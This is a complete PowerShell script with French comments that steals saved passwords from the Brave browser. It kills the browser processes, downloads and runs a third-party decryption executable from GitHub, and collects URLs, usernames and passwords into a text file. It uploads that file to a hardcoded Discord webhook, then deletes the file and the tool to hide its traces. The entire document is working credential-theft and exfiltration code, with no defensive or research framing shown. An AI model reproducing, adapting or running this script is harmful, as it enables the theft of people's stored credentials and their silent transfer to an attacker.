$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"

Get-Process brave,msedge,chrome -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 5

cd $env:TEMP

try {
    # Télécharger ChromeElevator
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing -TimeoutSec 30
    
    # Exécuter pour Brave
    $output = .\ce.exe brave -o out 2>&1 | Out-String
    Start-Sleep 3
    
    # Parser les JSON
    $results = @()
    Get-ChildItem out -Filter *.json -Recurse -EA 0 | ForEach-Object {
        $data = Get-Content $_.FullName -Raw | ConvertFrom-Json
        if ($data.passwords) {
            foreach ($p in $data.passwords) {
                $results += "[BRAVE] $($p.url)`nUsername: $($p.username)`nPassword: $($p.password)`n"
            }
        }
    }
    
    if ($results) {
        $report = "TOTAL: $($results.Count)`n" + ("="*60) + "`n`n" + ($results -join "`n")
        $report | Out-File "passwords.txt" -Encoding UTF8
        curl.exe -F "file=@passwords.txt" $wh 2>$null
        Remove-Item passwords.txt -Force
    } else {
        curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"⚠️ ChromeElevator ran but no passwords found`n$output`"}" $wh 2>$null
    }
    
    Remove-Item ce.exe,out -Recurse -Force -EA 0
    
} catch {
    curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"❌ Error: $($_.Exception.Message)`"}" $wh 2>$null
}
